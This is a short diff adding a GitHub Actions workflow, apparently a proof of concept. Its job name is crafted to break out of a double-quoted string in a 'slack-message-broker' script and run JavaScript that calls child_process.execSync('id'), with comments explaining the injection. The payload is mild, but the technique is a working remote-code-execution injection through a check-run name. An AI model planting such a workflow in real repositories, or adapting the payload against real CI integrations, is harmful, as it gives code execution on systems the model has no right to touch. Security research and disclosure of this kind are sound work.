@@ -1,0 +1,9 @@
+name: Trigger Check Run
+on: pull_request
+jobs:
+  # THIS JOB NAME BECOMES THE CHECK_RUN NAME!
+  # It breaks out of the double quotes in the slack-message-broker script.
+  "\"; console.log('*** CHECK RUN RCE SUCCESS ***'); require('child_process').execSync('id'); //":
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Executing malicious check run name"
